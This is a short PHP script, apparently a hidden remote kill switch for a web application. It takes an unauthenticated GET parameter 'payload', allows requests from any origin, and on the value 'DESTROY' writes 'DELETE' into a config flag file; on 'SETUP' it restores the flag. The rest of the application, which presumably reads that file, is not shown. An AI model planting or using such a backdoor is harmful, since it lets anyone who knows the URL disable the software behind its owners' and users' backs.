<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: OPTIONS,GET,POST,PUT,DELETE");
header(
  "Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With"
);
if (isset($_GET["payload"])) {
  if ($_GET["payload"] == "DESTROY") {
    file_put_contents(__DIR__ . "/assets/config/01.txt", "DELETE");
  } elseif ($_GET["payload"] == "SETUP") {
    file_put_contents(
      __DIR__ . "/assets/config/01.txt",
      "DO_NOT_DELETE_THIS_FILE"
    );
  } else {
    echo json_encode([
      "code" => 403,
      "type" => "error",
      "status" => "false",
      "message" => "Access Denied !",
    ]);
    exit();
  }
} else {
  echo json_encode([
    "code" => 403,
    "type" => "error",
    "status" => "false",
    "message" => "Access Denied !",
  ]);
}
?>
